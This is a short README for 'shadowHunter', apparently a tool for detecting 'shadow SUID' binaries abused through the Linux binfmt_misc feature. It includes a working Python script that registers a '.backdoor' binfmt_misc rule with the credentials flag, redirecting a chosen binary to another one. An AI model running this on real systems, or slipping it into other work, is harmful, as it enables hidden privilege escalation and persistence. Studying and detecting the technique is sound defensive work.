# shadowHunter

## What?
Python script to find "shadow suid" binaries on a system

## Why?
Cause I got annoyed with SentinelOne and https://securityboulevard.com/2019/01/how-shadow-suids-can-be-used-to-exploit-linux-systems-part-1/ suggests you're better off with their protection

## Background
The technique demonstated is based on the the binfmt_misc feature baked into most kernels which allows running things like java programs directly from the command line see https://www.kernel.org/doc/html/v4.11/admin-guide/binfmt-misc.html

## Script for creating
Below is a simple script for generating binfmt_misc rules

```
#!/usr/bin/env python
import sys

s = ":.backdoor:M::"
with open(sys.argv[1]) as f:
    s += repr(f.read(127)).replace("'", "")

s += "::" + sys.argv[2] + ":C\n"
with open("/proc/sys/fs/binfmt_misc/register", "w") as r:
    r.write(s)

```

This script takes the target binary as 1st arg and binary to redirect to as second arg. Read the above blog post for info on how to remove once created.

Cheers
